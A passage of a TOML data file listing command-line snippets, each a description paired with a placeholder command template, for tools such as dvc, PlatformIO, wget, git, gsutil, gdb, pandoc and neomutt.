  description = "Garbage collect from the cache, keeping only versions referenced by the current workspace"
  command = "dvc gc --workspace"
  output = ""

[[snippets]]
  description = "Garbage collect from the cache, keeping only versions referenced by branch, tags, and commits"
  command = "dvc gc --all-branches --all-tags --all-commits"
  output = ""

[[snippets]]
  description = "Garbage collect from the cache, including the default cloud remote storage (if set)"
  command = "dvc gc --all-commits --cloud"
  output = ""

[[snippets]]
  description = "Garbage collect from the cache, including a specific cloud remote storage"
  command = "dvc gc --all-commits --cloud --remote <remote_name>"
  output = ""

[[snippets]]
  description = "Install shell completion for the current shell (supports Bash, Fish, Zsh and PowerShell)"
  command = "pio system completion install"
  output = ""

[[snippets]]
  description = "Uninstall shell completion for the current shell"
  command = "pio system completion uninstall"
  output = ""

[[snippets]]
  description = "Display system-wide PlatformIO information"
  command = "pio system info"
  output = ""

[[snippets]]
  description = "Remove unused PlatformIO data"
  command = "pio system prune"
  output = ""

[[snippets]]
  description = "Remove only cached data"
  command = "pio system prune --cache"
  output = ""

[[snippets]]
  description = "List unused PlatformIO data that would be removed but do not actually remove it"
  command = "pio system prune --dry-run"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a CMU window manager bitmap"
  command = "pbmtocmuwm <path/to/image.pbm> > <path/to/output.bmp>"
  output = ""

[[snippets]]
  description = "Convert a raw greyscale image to a PGM image"
  command = "rawtopgm <width> <height> <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Convert a raw greyscale image to a PGM image, assume the image to be a square"
  command = "rawtopgm <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Convert a raw greyscale image in which the pixels come bottom-first instead of top-first to a PGM image"
  command = "rawtopgm <width> <height> -bottomfirst <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Ignore the first n bytes of the specified file"
  command = "rawtopgm <width> <height> -headerskip <n> <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Ignore the last m bytes of each row in the specified file"
  command = "rawtopgm <width> <height> -rowskip <m> <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the maxval for the grey values in the input to be equal to N"
  command = "rawtopgm <width> <height> -maxval <N> <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the number of bytes that represent each sample in the input and that the byte-sequence is to be interpreted as little-endian"
  command = "rawtopgm <width> <height> -bpp <1|2> -littleendian <path/to/image.raw> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Make a new draft"
  command = "lb new"
  output = ""

[[snippets]]
  description = "Edit a draft"
  command = "lb edit"
  output = ""

[[snippets]]
  description = "Delete a draft"
  command = "lb trash"
  output = ""

[[snippets]]
  description = "Publish a draft"
  command = "lb publish"
  output = ""

[[snippets]]
  description = "Delete a published post"
  command = "lb delete"
  output = ""

[[snippets]]
  description = "Unpublish a published post to edit it as a draft again"
  command = "lb revise"
  output = ""

[[snippets]]
  description = "Print shared object mappings for a Java process (output like pmap)"
  command = "jmap <java_pid>"
  output = ""

[[snippets]]
  description = "Print heap summary information"
  command = "jmap -heap <filename.jar> <java_pid>"
  output = ""

[[snippets]]
  description = "Print histogram of heap usage by type"
  command = "jmap -histo <java_pid>"
  output = ""

[[snippets]]
  description = "Dump contents of the heap into a binary file for analysis with jhat"
  command = "jmap -dump:format=b,file=<path/to/file> <java_pid>"
  output = ""

[[snippets]]
  description = "Dump live objects of the heap into a binary file for analysis with jhat"
  command = "jmap -dump:live,format=b,file=<path/to/file> <java_pid>"
  output = ""

[[snippets]]
  description = "Start server with default config"
  command = "traefik"
  output = ""

[[snippets]]
  description = "Start server with a custom configuration file"
  command = "traefik --c <config_file.toml>"
  output = ""

[[snippets]]
  description = "Start server with cluster mode enabled"
  command = "traefik --cluster"
  output = ""

[[snippets]]
  description = "Start server with web UI enabled"
  command = "traefik --web"
  output = ""

[[snippets]]
  description = "List available service names"
  command = "qdbus"
  output = ""

[[snippets]]
  description = "List object paths for a specific service"
  command = "qdbus <service_name>"
  output = ""

[[snippets]]
  description = "List methods, signals and properties available on a specific object"
  command = "qdbus <service_name> </path/to/object>"
  output = ""

[[snippets]]
  description = "Execute a specific method passing arguments and display the returned value"
  command = "qdbus <service_name> </path/to/object> <method_name> <argument1> <argument2>"
  output = ""

[[snippets]]
  description = "Display the current brightness value in a KDE Plasma session"
  command = "qdbus <org.kde.Solid.PowerManagement> </org/kde/Solid/PowerManagement/Actions/BrightnessControl> <org.kde.Solid.PowerManagement.Actions.BrightnessControl.brightness>"
  output = ""

[[snippets]]
  description = "Set a specific brightness to a KDE Plasma session"
  command = "qdbus <org.kde.Solid.PowerManagement> </org/kde/Solid/PowerManagement/Actions/BrightnessControl> <org.kde.Solid.PowerManagement.Actions.BrightnessControl.setBrightness> <5000>"
  output = ""

[[snippets]]
  description = "Invoke volume up shortcut in a KDE Plasma session"
  command = "qdbus <org.kde.kglobalaccel> </component/kmix> <invokeShortcut> ""<increase_volume>"""
  output = ""

[[snippets]]
  description = "Gracefully log out and then do nothing, reboot or shut down"
  command = "qdbus <org.kde.Shutdown> </Shutdown> <logout|logoutAndReboot|logoutAndShutdown>"
  output = ""

[[snippets]]
  description = "Send the changes to Differential for review"
  command = "arc diff"
  output = ""

[[snippets]]
  description = "Show pending revision information"
  command = "arc list"
  output = ""

[[snippets]]
  description = "Update Git commit messages after review"
  command = "arc amend"
  output = ""

[[snippets]]
  description = "Push Git changes"
  command = "arc land"
  output = ""

[[snippets]]
  description = "Validate one or more XML documents for well-formedness only"
  command = "xml validate <path/to/input1.xml|URI> <input2.xml ...>"
  output = ""

[[snippets]]
  description = "Validate one or more XML documents against a Document Type Definition (DTD)"
  command = "xml validate --dtd <path/to/schema.dtd> <path/to/input1.xml|URI> <input2.xml ...>"
  output = ""

[[snippets]]
  description = "Validate one or more XML documents against an XML Schema Definition (XSD)"
  command = "xml validate --xsd <path/to/schema.xsd> <path/to/input1.xml|URI> <input2.xml ...>"
  output = ""

[[snippets]]
  description = "Validate one or more XML documents against a Relax NG schema (RNG)"
  command = "xml validate --relaxng <path/to/schema.rng> <path/to/input1.xml|URI> <input2.xml ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml validate --help"
  output = ""

[[snippets]]
  description = "Sniff the specified directory for issues (defaults to the PEAR standard)"
  command = "phpcs <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display a list of installed coding standards"
  command = "phpcs -i"
  output = ""

[[snippets]]
  description = "Specify a coding standard to validate against"
  command = "phpcs <path/to/directory> --standard <standard>"
  output = ""

[[snippets]]
  description = "Specify comma-separated file extensions to include when sniffing"
  command = "phpcs <path/to/directory> --extensions <file_extension1,file_extension2,...>"
  output = ""

[[snippets]]
  description = "Specify the format of the output report (e.g. `full`, `xml`, `json`, `summary`)"
  command = "phpcs <path/to/directory> --report <format>"
  output = ""

[[snippets]]
  description = "Set configuration variables to be used during the process"
  command = "phpcs <path/to/directory> --config-set <key> <value>"
  output = ""

[[snippets]]
  description = "A comma-separated list of files to load before processing"
  command = "phpcs <path/to/directory> --bootstrap <path/to/file1,path/to/file2,...>"
  output = ""

[[snippets]]
  description = "Don't recurse into subdirectories"
  command = "phpcs <path/to/directory> -l"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project in the default system temporary directory and delete it afterwards"
  command = "pio ci <path/to/project>"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project and specify specific libraries"
  command = "pio ci --lib <path/to/library_directory> <path/to/project>"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project and specify a specific board (`pio boards` lists all of them)"
  command = "pio ci --board <board> <path/to/project>"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project in a specific directory"
  command = "pio ci --build-dir <path/to/build_directory> <path/to/project>"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project and don't delete the build directory"
  command = "pio ci --keep-build-dir <path/to/project>"
  output = ""

[[snippets]]
  description = "Build a PlatformIO project using a specific configuration file"
  command = "pio ci --project-conf <path/to/platformio.ini>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pio"
  output = ""

[[snippets]]
  description = "Set a reminder at a given time"
  command = "leave <time_to_leave>"
  output = ""

[[snippets]]
  description = "Set a reminder to leave at noon"
  command = "leave <1200>"
  output = ""

[[snippets]]
  description = "Set a reminder in a specific amount of time"
  command = "leave +<amount_of_time>"
  output = ""

[[snippets]]
  description = "Set a reminder to leave in 4 hours and 4 minutes"
  command = "leave +<0404>"
  output = ""

[[snippets]]
  description = "Install or update an application anonymously"
  command = "steamcmd +login <anonymous> +app_update <appid> +quit"
  output = ""

[[snippets]]
  description = "Install or update an application using the specified credentials"
  command = "steamcmd +login <username> +app_update <appid> +quit"
  output = ""

[[snippets]]
  description = "Install an application for a specific platform"
  command = "steamcmd +@sSteamCmdForcePlatformType <windows> +login <anonymous> +app_update <appid> validate +quit"
  output = ""

[[snippets]]
  description = "List global (extern) functions in a file (prefixed with T)"
  command = "nm -g <path/to/file.o>"
  output = ""

[[snippets]]
  description = "List only undefined symbols in a file"
  command = "nm -u <path/to/file.o>"
  output = ""

[[snippets]]
  description = "List all symbols, even debugging symbols"
  command = "nm -a <path/to/file.o>"
  output = ""

[[snippets]]
  description = "Demangle C++ symbols (make them readable)"
  command = "nm --demangle <path/to/file.o>"
  output = ""

[[snippets]]
  description = "Build an appliance"
  command = "kiwi-ng system build --description=<path/to/directory> --target-dir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Show build result of built appliance"
  command = "kiwi-ng result list --target-dir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "kiwi-ng help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "kiwi-ng -v"
  output = ""

[[snippets]]
  description = "Download the contents of a URL to a file (named "foo" in this case)"
  command = "wget <https://example.com/foo>"
  output = ""

[[snippets]]
  description = "Download the contents of a URL to a file (named "bar" in this case)"
  command = "wget --output-document <bar> <https://example.com/foo>"
  output = ""

[[snippets]]
  description = "Download a single web page and all its resources with 3-second intervals between requests (scripts, stylesheets, images, etc.)"
  command = "wget --page-requisites --convert-links --wait=3 <https://example.com/somepage.html>"
  output = ""

[[snippets]]
  description = "Download all listed files within a directory and its sub-directories (does not download embedded page elements)"
  command = "wget --mirror --no-parent <https://example.com/somepath/>"
  output = ""

[[snippets]]
  description = "Limit the download speed and the number of connection retries"
  command = "wget --limit-rate=<300k> --tries=<100> <https://example.com/somepath/>"
  output = ""

[[snippets]]
  description = "Download a file from an HTTP server using Basic Auth (also works for FTP)"
  command = "wget --user=<username> --password=<password> <https://example.com>"
  output = ""

[[snippets]]
  description = "Continue an incomplete download"
  command = "wget --continue <https://example.com>"
  output = ""

[[snippets]]
  description = "Download all URLs stored in a text file to a specific directory"
  command = "wget --directory-prefix <path/to/directory> --input-file <URLs.txt>"
  output = ""

[[snippets]]
  description = "Convert a MGR bitmap into a PBM file"
  command = "mgrtopbm <path/to/image.mgr> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Synchronize IMAP account between host1 and host2"
  command = "imapsync --host1 <host1> --user1 <user1> --password1 <secret1> --host2 <host2> --user2 <user2> --password2 <secret2>"
  output = ""

[[snippets]]
  description = "Create a commit object with the specified message"
  command = "git commit-tree <tree> -m ""<message>"""
  output = ""

[[snippets]]
  description = "Create a commit object reading the message from a file (use `-` for `stdin`)"
  command = "git commit-tree <tree> -F <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a GPG-signed commit object"
  command = "git commit-tree <tree> -m ""<message>"" --gpg-sign"
  output = ""

[[snippets]]
  description = "Create a commit object with the specified parent commit object"
  command = "git commit-tree <tree> -m ""<message>"" -p <parent_commit_sha>"
  output = ""

[[snippets]]
  description = "Search for a pattern within one or more `tar` archives"
  command = "ptargrep ""<search_pattern>"" <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Extract to the current directory using the basename of the file from the archive"
  command = "ptargrep --basename ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a case-insensitive pattern matching within a `tar` archive"
  command = "ptargrep --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Launch the GUI"
  command = "git gui"
  output = ""

[[snippets]]
  description = "Show a specific file with author name and commit hash on each line"
  command = "git gui blame <path/to/file>"
  output = ""

[[snippets]]
  description = "Open `git gui blame` in a specific revision"
  command = "git gui blame <revision> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open `git gui blame` and scroll the view to center on a specific line"
  command = "git gui blame --line=<line> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a window to make one commit and return to the shell when it is complete"
  command = "git gui citool"
  output = ""

[[snippets]]
  description = "Open `git gui citool` in the "Amend Last Commit" mode"
  command = "git gui citool --amend"
  output = ""

[[snippets]]
  description = "Open `git gui citool` in a read-only mode"
  command = "git gui citool --nocommit"
  output = ""

[[snippets]]
  description = "Show a browser for the tree of a specific branch, opening the blame tool when clicking on the files"
  command = "git gui browser maint"
  output = ""

[[snippets]]
  description = "Start `peco` on all files in the specified directory"
  command = "find <path/to/directory> -type f | peco"
  output = ""

[[snippets]]
  description = "Start `peco` for running processes"
  command = "ps aux | peco"
  output = ""

[[snippets]]
  description = "Start `peco` with a specified query"
  command = "peco --query ""<query>"""
  output = ""

[[snippets]]
  description = "Convert a PBM image into a UNIX plot file"
  command = "pbmtoplot <path/to/image.pbm> > <path/to/output.plot>"
  output = ""

[[snippets]]
  description = "Use symbol definitions from a file"
  command = "gnatprep <source_file> <target_file> <definitions_file>"
  output = ""

[[snippets]]
  description = "Specify symbol values in the command-line"
  command = "gnatprep -D<name>=<value> <source_file> <target_file>"
  output = ""

[[snippets]]
  description = "Show the name of the currently active branch"
  command = "hg branch"
  output = ""

[[snippets]]
  description = "Create a new branch for the next commit"
  command = "hg branch <branch_name>"
  output = ""

[[snippets]]
  description = "Terminate a program using the default SIGTERM (terminate) signal"
  command = "kill <process_id>"
  output = ""

[[snippets]]
  description = "List available signal names (to be used without the `SIG` prefix)"
  command = "kill -l"
  output = ""

[[snippets]]
  description = "Terminate a program using the SIGHUP (hang up) signal. Many daemons will reload instead of terminating"
  command = "kill -<1|HUP> <process_id>"
  output = ""

[[snippets]]
  description = "Terminate a program using the SIGINT (interrupt) signal. This is typically initiated by the user pressing `Ctrl + C`"
  command = "kill -<2|INT> <process_id>"
  output = ""

[[snippets]]
  description = "Signal the operating system to immediately terminate a program (which gets no chance to capture the signal)"
  command = "kill -<9|KILL> <process_id>"
  output = ""

[[snippets]]
  description = "Signal the operating system to pause a program until a SIGCONT ("continue") signal is received"
  command = "kill -<17|STOP> <process_id>"
  output = ""

[[snippets]]
  description = "Send a `SIGUSR1` signal to all processes with the given GID (group id)"
  command = "kill -<SIGUSR1> -<group_id>"
  output = ""

[[snippets]]
  description = "Open Mumble"
  command = "mumble"
  output = ""

[[snippets]]
  description = "Open Mumble and immediately connect to a server"
  command = "mumble mumble://<username>@<example.com>"
  output = ""

[[snippets]]
  description = "Open Mumble and immediately connect to a password protected server"
  command = "mumble mumble://<username>:<password>@<example.com>"
  output = ""

[[snippets]]
  description = "Mute/unmute the microphone in a running Mumble instance"
  command = "mumble rpc <mute|unmute>"
  output = ""

[[snippets]]
  description = "Mute/unmute the microphone and the audio output of Mumble"
  command = "mumble rpc <deaf|undeaf>"
  output = ""

[[snippets]]
  description = "Connect to a local database on the default port (`mongodb://localhost:27017`)"
  command = "mongosh"
  output = ""

[[snippets]]
  description = "Connect to a database"
  command = "mongosh --host <host> --port <port> <db_name>"
  output = ""

[[snippets]]
  description = "Authenticate using the specified username on the specified database (you will be prompted for a password)"
  command = "mongosh --host <host> --port <port> --username <username> --authenticationDatabase <authdb_name> <db_name>"
  output = ""

[[snippets]]
  description = "Evaluate a JavaScript expression on a database"
  command = "mongosh --eval '<JSON.stringify(db.foo.findOne())>' <db_name>"
  output = ""

[[snippets]]
  description = "Download a [c]ourse using cookie-based authentication"
  command = "llvd -c <course-slug> --cookies"
  output = ""

[[snippets]]
  description = "Download a course at a specific [r]esolution"
  command = "llvd -c <course-slug> -r 720"
  output = ""

[[snippets]]
  description = "Download a course with [ca]ptions (subtitles)"
  command = "llvd -c <course-slug> --caption"
  output = ""

[[snippets]]
  description = "Download a course [p]ath with [t]hrottling between 10 to 30 seconds"
  command = "llvd -p <path-slug> -t <10,30> --cookies"
  output = ""

[[snippets]]
  description = "Print logged in usernames"
  command = "users"
  output = ""

[[snippets]]
  description = "Print logged in usernames according to a given file"
  command = "users </var/log/wmtp>"
  output = ""

[[snippets]]
  description = "Generate a binding between C++ and Python"
  command = "swig -c++ -python -o <path/to/output_wrapper.cpp> <path/to/swig_file.i>"
  output = ""

[[snippets]]
  description = "Generate a binding between C++ and Go"
  command = "swig -go -cgo -intgosize 64 -c++ <path/to/swig_file.i>"
  output = ""

[[snippets]]
  description = "Generate a binding between C and Java"
  command = "swig -java <path/to/swig_file.i>"
  output = ""

[[snippets]]
  description = "Generate a binding between C and Ruby and prefix the Ruby module with `foo::bar::`"
  command = "swig -ruby -prefix ""<foo::bar::>"" <path/to/swig_file.i>"
  output = ""

[[snippets]]
  description = "Read a PNM image as input and produce a PNG image as output"
  command = "pnmtopng <path/to/file.pnm> > <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pnmtopng -version"
  output = ""

[[snippets]]
  description = "Convert a PBM file to an HP LaserJet file"
  command = "pbmtolj <path/to/input.pbm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Compress the output file using the specified method"
  command = "pbmtolj -<packbits|delta|compress> <path/to/input.pbm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Specify the required resolution"
  command = "pbmtolj -resolution <75|100|150|300|600> <path/to/input.pbm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Display the partition table stored in an image file"
  command = "mmls <path/to/image_file>"
  output = ""

[[snippets]]
  description = "Display the partition table with an additional column for the partition size"
  command = "mmls -B -i <path/to/image_file>"
  output = ""

[[snippets]]
  description = "Display the partition table in a split EWF image"
  command = "mmls -i ewf <image.e01> <image.e02>"
  output = ""

[[snippets]]
  description = "Display nested partition tables"
  command = "mmls -t <nested_table_type> -o <offset> <path/to/image_file>"
  output = ""

[[snippets]]
  description = "List all buckets in a project you are logged into"
  command = "gsutil ls"
  output = ""

[[snippets]]
  description = "List the objects in a bucket"
  command = "gsutil ls -r 'gs://<bucket_name>/<prefix>**'"
  output = ""

[[snippets]]
  description = "Download an object from a bucket"
  command = "gsutil cp gs://<bucket_name>/<object_name> <path/to/save_location>"
  output = ""

[[snippets]]
  description = "Upload an object to a bucket"
  command = "gsutil cp <object_location> gs://<destination_bucket_name>/"
  output = ""

[[snippets]]
  description = "Rename or move objects in a bucket"
  command = "gsutil mv gs://<bucket_name>/<old_object_name> gs://<bucket_name>/<new_object_name>"
  output = ""

[[snippets]]
  description = "Create a new bucket in the project you are logged into"
  command = "gsutil mb gs://<bucket_name>"
  output = ""

[[snippets]]
  description = "Delete a bucket and remove all the objects in it"
  command = "gsutil rm -r gs://<bucket_name>"
  output = ""

[[snippets]]
  description = "Interactively select a workflow to view the latest jobs for"
  command = "gh workflow view"
  output = ""

[[snippets]]
  description = "View a specific workflow in the default browser"
  command = "gh workflow view <id|workflow_name|filename.yml> --web"
  output = ""

[[snippets]]
  description = "Display the YAML definition of a specific workflow"
  command = "gh workflow view <id|workflow_name|filename.yml> --yaml"
  output = ""

[[snippets]]
  description = "Display the YAML definition for a specific Git branch or tag"
  command = "gh workflow view <id|workflow_name|filename.yml> --ref <branch|tag_name> --yaml"
  output = ""

[[snippets]]
  description = "List workflow files (use `--all` to include disabled workflows)"
  command = "gh workflow list"
  output = ""

[[snippets]]
  description = "Run a manual workflow with parameters"
  command = "gh workflow run <id|workflow_name|filename.yml> <--raw-field param1=value1 --raw-field param2=value2 ...>"
  output = ""

[[snippets]]
  description = "Run a manual workflow using a specific branch or tag with JSON parameters from `stdin`"
  command = "echo '<{""param1"": ""value1"", ""param2"": ""value2"", ...>}' | gh workflow run <id|workflow_name|filename.yml> --ref <branch|tag_name>"
  output = ""

[[snippets]]
  description = "Enable or disable a specific workflow"
  command = "gh workflow <enable|disable> <id|workflow_name|filename.yml>"
  output = ""

[[snippets]]
  description = "Initialize a workspace in the current directory"
  command = "avo init"
  output = ""

[[snippets]]
  description = "Log into the Avo platform"
  command = "avo login"
  output = ""

[[snippets]]
  description = "Switch to an existing Avo branch"
  command = "avo checkout <branch_name>"
  output = ""

[[snippets]]
  description = "Pull analytics wrappers for the current path"
  command = "avo pull"
  output = ""

[[snippets]]
  description = "Display the status of the Avo implementation"
  command = "avo status"
  output = ""

[[snippets]]
  description = "Resolve Git conflicts in Avo files"
  command = "avo conflict"
  output = ""

[[snippets]]
  description = "Open the current Avo workspace in the default web browser"
  command = "avo edit"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "avo <subcommand> --help"
  output = ""

[[snippets]]
  description = "Connect to an InfluxDB running on localhost with no credentials"
  command = "influx"
  output = ""

[[snippets]]
  description = "Connect with a specific username (will prompt for a password)"
  command = "influx -username <username> -password """""
  output = ""

[[snippets]]
  description = "Connect to a specific host"
  command = "influx -host <hostname>"
  output = ""

[[snippets]]
  description = "Use a specific database"
  command = "influx -database <database_name>"
  output = ""

[[snippets]]
  description = "Execute a given command"
  command = "influx -execute ""<influxql_command>"""
  output = ""

[[snippets]]
  description = "Return output in a specific format"
  command = "influx -execute ""<influxql_command>"" -format <json|csv|column>"
  output = ""

[[snippets]]
  description = "Create a tar archive from the contents of the current HEAD and print it to `stdout`"
  command = "git archive --verbose HEAD"
  output = ""

[[snippets]]
  description = "Create a zip archive from the current HEAD and print it to `stdout`"
  command = "git archive --verbose --format zip HEAD"
  output = ""

[[snippets]]
  description = "Same as above, but write the zip archive to file"
  command = "git archive --verbose --output <path/to/file.zip> HEAD"
  output = ""

[[snippets]]
  description = "Create a tar archive from the contents of the latest commit on a specific branch"
  command = "git archive --output <path/to/file.tar> <branch_name>"
  output = ""

[[snippets]]
  description = "Create a tar archive from the contents of a specific directory"
  command = "git archive --output <path/to/file.tar> HEAD:<path/to/directory>"
  output = ""

[[snippets]]
  description = "Prepend a path to each file to archive it inside a specific directory"
  command = "git archive --output <path/to/file.tar> --prefix <path/to/prepend>/ HEAD"
  output = ""

[[snippets]]
  description = "Run iperf3 as a server"
  command = "iperf3 -s"
  output = ""

[[snippets]]
  description = "Run an iperf3 server on a specific port"
  command = "iperf3 -s -p <port>"
  output = ""

[[snippets]]
  description = "Start bandwidth test"
  command = "iperf3 -c <server>"
  output = ""

[[snippets]]
  description = "Run iperf3 in multiple parallel streams"
  command = "iperf3 -c <server> -P <streams>"
  output = ""

[[snippets]]
  description = "Reverse direction of the test. Server sends data to the client"
  command = "iperf3 -c <server> -R"
  output = ""

[[snippets]]
  description = "Debug an executable"
  command = "gdb <executable>"
  output = ""

[[snippets]]
  description = "Attach a process to gdb"
  command = "gdb -p <procID>"
  output = ""

[[snippets]]
  description = "Debug with a core file"
  command = "gdb -c <core> <executable>"
  output = ""

[[snippets]]
  description = "Execute given GDB commands upon start"
  command = "gdb -ex ""<commands>"" <executable>"
  output = ""

[[snippets]]
  description = "Start `gdb` and pass arguments to the executable"
  command = "gdb --args <executable> <argument1> <argument2>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr gh-codespace"
  output = ""

[[snippets]]
  description = "Create a file holding the contents of the blob specified by its ID then print the name of the temporary file"
  command = "git unpack-file <blob_id>"
  output = ""

[[snippets]]
  description = "Convert file to PDF (the output format is determined by file extension)"
  command = "pandoc <input.md> -o <output.pdf>"
  output = ""

[[snippets]]
  description = "Force conversion to use a specific format"
  command = "pandoc <input.docx> --to <gfm> -o <output.md>"
  output = ""

[[snippets]]
  description = "Convert to a standalone file with the appropriate headers/footers (for LaTeX, HTML, etc.)"
  command = "pandoc <input.md> -s -o <output.tex>"
  output = ""

[[snippets]]
  description = "List all supported input formats"
  command = "pandoc --list-input-formats"
  output = ""

[[snippets]]
  description = "List all supported output formats"
  command = "pandoc --list-output-formats"
  output = ""

[[snippets]]
  description = "Register an existing VM"
  command = "VBoxManage registervm <path/to/filename.vbox>"
  output = ""

[[snippets]]
  description = "Supply the encryption password file of the VM"
  command = "VBoxManage registervm <path/to/filename.vbox> --password <path/to/password_file>"
  output = ""

[[snippets]]
  description = "Prompt for the encryption password on the command line"
  command = "VBoxManage registervm <path/to/filename.vbox> --password -"
  output = ""

[[snippets]]
  description = "Start an access point"
  command = "sudo hostapd <path/to/hostapd.conf>"
  output = ""

[[snippets]]
  description = "Start an access point, forking into the background"
  command = "sudo hostapd -B <path/to/hostapd.conf>"
  output = ""

[[snippets]]
  description = "Publish a temperature value of 32 on the topic `sensors/temperature` to 192.168.1.1 (defaults to `localhost`) with Quality of Service (`QoS`) set to 1"
  command = "mosquitto_pub -h <192.168.1.1> -t <sensors/temperature> -m <32> -q <1>"
  output = ""

[[snippets]]
  description = "Publish timestamp and temperature data on the topic `sensors/temperature` to a remote host on a non-standard port"
  command = "mosquitto_pub -h <192.168.1.1> -p <1885> -t <sensors/temperature> -m ""<1266193804 32>"""
  output = ""

[[snippets]]
  description = "Publish light switch status and retain the message on the topic `switches/kitchen_lights/status` to a remote host because there may be a long period of time between light switch events"
  command = "mosquitto_pub -r -h ""<iot.eclipse.org>"" -t <switches/kitchen_lights/status> -m ""<on>"""
  output = ""

[[snippets]]
  description = "Send the contents of a file (`data.txt`) as a message and publish it to `sensors/temperature` topic"
  command = "mosquitto_pub -t <sensors/temperature> -f <data.txt>"
  output = ""

[[snippets]]
  description = "Send the contents of a file (`data.txt`), by reading from `stdin` and send the entire input as a message and publish it to `sensors/temperature` topic"
  command = "mosquitto_pub -t <sensors/temperature> -s < <data.txt>"
  output = ""

[[snippets]]
  description = "Read newline delimited data from `stdin` as a message and publish it to `sensors/temperature` topic"
  command = "<echo data.txt> | mosquitto_pub -t <sensors/temperature> -l"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a BitGraph terminal Display Pixel Data sequence"
  command = "pbmtobbnbg < <path/to/image.pbm> > <path/to/output.dpd>"
  output = ""

[[snippets]]
  description = "Specify the rasterop"
  command = "pbmtobbnbg <3> < <path/to/image.pbm> > <path/to/output.dpd>"
  output = ""

[[snippets]]
  description = "Convert a file to the specified format (automatically determined from the file extension)"
  command = "mmdc --input <input.mmd> --output <output.svg>"
  output = ""

[[snippets]]
  description = "Specify the theme of the chart"
  command = "mmdc --input <input.mmd> --output <output.svg> --theme <forest|dark|neutral|default>"
  output = ""

[[snippets]]
  description = "Specify the background color of the chart (e.g. `lime`, `"#D8064F"`, or `transparent`)"
  command = "mmdc --input <input.mmd> --output <output.svg> --backgroundColor <color>"
  output = ""

[[snippets]]
  description = "Generate a 2048bit prime number and display it in hexadecimal"
  command = "openssl prime -generate -bits 2048 -hex"
  output = ""

[[snippets]]
  description = "Check if a given number is prime"
  command = "openssl prime <number>"
  output = ""

[[snippets]]
  description = "Create a new searchable PDF/A file from a scanned PDF or image file"
  command = "ocrmypdf <path/to/input_file> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Replace a scanned PDF file with a searchable PDF file"
  command = "ocrmypdf <path/to/file.pdf> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Skip pages of a mixed-format input PDF file that already contain text"
  command = "ocrmypdf --skip-text <path/to/input.pdf> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Clean, de-skew, and rotate pages of a poor scan"
  command = "ocrmypdf --clean --deskew --rotate-pages <path/to/input_file> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Set the metadata of the searchable PDF file"
  command = "ocrmypdf --title ""<title>"" --author ""<author>"" --subject ""<subject>"" --keywords ""<keyword; key phrase; ...>"" <path/to/input_file> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ocrmypdf --help"
  output = ""

[[snippets]]
  description = "Test a server on port 443"
  command = "sslscan <example.com>"
  output = ""

[[snippets]]
  description = "Test a specified port"
  command = "sslscan <example.com>:<465>"
  output = ""

[[snippets]]
  description = "Show certificate information"
  command = "testssl --show-certificate <example.com>"
  output = ""

[[snippets]]
  description = "Fetch a specific version of a jar"
  command = "cs fetch <group_id>:<artifact_id>:<artifact_version>"
  output = ""

[[snippets]]
  description = "Fetch a package and evaluate the classpath corresponding to the selected package in an env var"
  command = "CP=""$(cs fetch --classpath org.scalameta::scalafmt-cli:latest.release)"""
  output = ""

[[snippets]]
  description = "Fetch a source of a specific jar"
  command = "cs fetch --sources <group_id>:<artifact_id>:<artifact_version>"
  output = ""

[[snippets]]
  description = "Fetch the javadoc jars"
  command = "cs fetch --javadoc <group_id>:<artifact_id>:<artifact_version>"
  output = ""

[[snippets]]
  description = "Fetch dependency with javadoc jars and source jars"
  command = "cs fetch --default=<true> --sources --javadoc <group_id>:<artifact_id>:<artifact_version>"
  output = ""

[[snippets]]
  description = "Fetch jars coming from dependency files"
  command = "cs fetch <--dependency-file path/to/file1 --dependency-file path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open the specified mailbox"
  command = "neomutt -f <path/to/mailbox>"
  output = ""

[[snippets]]
  description = "Start writing an email and specify a subject and a `cc` recipient"
  command = "neomutt -s ""<subject>"" -c <cc@example.com> <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Send an email with files attached"
  command = "neomutt -a <path/to/file1 path/to/file2 ...> -- <recipient@example.com>"
  output = ""

[[snippets]]
  description = "Specify a file to include as the message body"
  command = "neomutt -i <path/to/file> <recipient@example.com>"
  output = ""

[[snippets]]
